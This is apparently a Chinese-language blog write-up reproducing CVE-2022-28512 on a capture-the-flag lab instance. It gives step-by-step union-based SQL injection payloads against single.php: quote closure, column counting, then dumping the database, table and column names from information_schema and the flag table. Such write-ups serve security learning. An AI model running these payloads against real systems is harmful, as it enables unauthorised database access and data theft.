---
title: CVE-2022-28512
subtitle:
date: 2025-03-14T12:31:43+08:00
slug: 2d91a81
draft: false
author:
  name: T1ng
  link:
  email:
  avatar: /images/avater.jpg
description:
keywords:
license:
comment: false
weight: 0
tags:
  - CVE
categories:
  - 复现
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRelated: false
hiddenFromFeed: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->

<!-- Place resource files in the current article directory and reference them using relative paths, like this: `![alt](images/screenshot.jpg)`. -->



![](images/05fc58e4d286d3c2c23eb706b30ff1a2.png)

发现并没有什么可用的，看到题目提示，直接访问

```
http://eci-2ze1snkmg1wia23zk99t.cloudeci1.ichunqiu.com/single.php
```



![](images/e11222ab8431fbb5c43b5b0193854d13.png)



| 1                                                            | 判断注入点   |
| ------------------------------------------------------------ | ------------ |
| 2                                                            | 爆字段个数   |
| 3                                                            | 爆显位位置   |
| 4                                                            | 爆数据库名   |
| 5                                                            | 爆数据库表名 |
| 6                                                            | 爆数据库列名 |
| 7                                                            | 爆数据库数据 |
| 用1=1和and 1=2测试，发现页面正常，排除数字型。测试到3'发现报错 |              |
| ![](images/82e637b055cc8953041960d1bedb2394.png)             |              |
| 根据报错信息可知，单引号闭合，构造playload                   |              |

```
id=3'--+
```

首先爆字段个数，注入语句，发现到10时报错，显示位数为9

```
id=3' order by 9--+
```



![](images/dca74f1d7bdda5cb1757b2f136091db5.png)




爆显位位置，注入语句为

```
id=-3' union select 1,2,3,4,5,6,7,8,9--+
```



![](images/cbc0db57a21de3ecd37f9245fbffa5af.png)

4可以注入，语句

```
id=-3' union select 1,2,3,database(),5,6,7,8,9--+
```



![](images/c487dc06770823d4581c85af07d07deb.png)

发现数据库名称为ctf，接下来爆破库表名

```
id=-3' union select 1,2,3,group_concat(table_name),5,6,7,8,9 from information_schema.tables where table_schema=database()--+
```



![](images/89c660d1c9aa6d8a001c66488f45d31e.png)

得到数据库表名

```
titles,page_hits,membership_userpermissions,membership_groups,blog_categories,membership_userrecords,membership_users,editors_choice,blogs,links,flag,banner_posts,membership_grouppermissions,visitor_info
```

关键词为flag，爆破列名，注入语句为

```
id=-3' union select 1,2,3,group_concat(column_name),5,6,7,8,9 from information_schema.columns where table_schema=database() and table_name="flag"--+
```



![](images/f05a9102e6bac84d5df3cb913a4e6833.png)

爆破数据库数据，注入语句为

```
id=-3' union select 1,2,3,group_concat(flag),5,6,7,8,9 from flag --+
```



![](images/b7b20b166cfe751b021eec72a47d47a8.png)

